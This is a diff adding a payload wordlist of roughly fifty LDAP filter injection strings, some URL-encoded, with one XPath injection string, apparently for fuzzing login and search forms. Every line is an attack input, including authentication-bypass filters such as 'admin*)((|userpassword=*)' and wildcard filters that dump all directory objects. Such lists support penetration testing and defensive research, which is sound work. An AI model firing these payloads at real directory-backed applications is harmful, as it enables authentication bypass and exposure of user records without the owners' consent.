@@ -1,0 +1,50 @@
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+(
+)
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+/
+//
+//*
+@*
+x' or name()='username' or 'x'='y
+|
+*()|&'
+admin*
+admin*)((|userpassword=*)
+*)(uid=*))(|(uid=*
+)(objectClass=))(&objectClass=void
+(&(objectClass= )(objectClass=))(&objectClass=void )(type=Pepi*))
+(&(USER=Uname)(PASSWORD=Pwd))
+(&(USER=john90)(&))(PASSWORD=Pwd))
+(&(directory=Information)(security_level=*))(&(directory=Information)(security_level=low))
+(|(type=Resource1)(type=Resource2))
+(|(type=Jeans)(uid=*))(type=T-Shirts))
+value)(injected_filter
+(attribute=value)(injected_filter)
+(&(attribute=value)(second_filter))
+(|(attribute=value)(second_filter))
+(&(attribute=value)(injected_filter)) (second_filter)).
+value)(injected_filter))(&(1=0
+(&(attribute=value)(injected_filter))(&1=0) (second_filter)).
+(&(attribute=value)(injected_filter))(second_filter)).
+(&(parameter1=value1)(parameter2=value2))
+(|(parameter=value1)(parameter2=value2))
+(&(objectClass=Shirt)(type=Puma*))
+(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Puma*))
+(&(objectClass=*)(objectClass=users))(&(objectClass=foo)(type=Puma*))
+(&(objectClass=*)(objectClass=Resources))(&(objectClass=foo)(type=Puma*))
+(|(objectClass=void)(objectClass=void))(&(objectClass=void)(type=Puma*))
+(|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=Puma*))
+(|(objectClass=void)(objectClass=Resources))(&(objectClass=void)(type=Puma*))
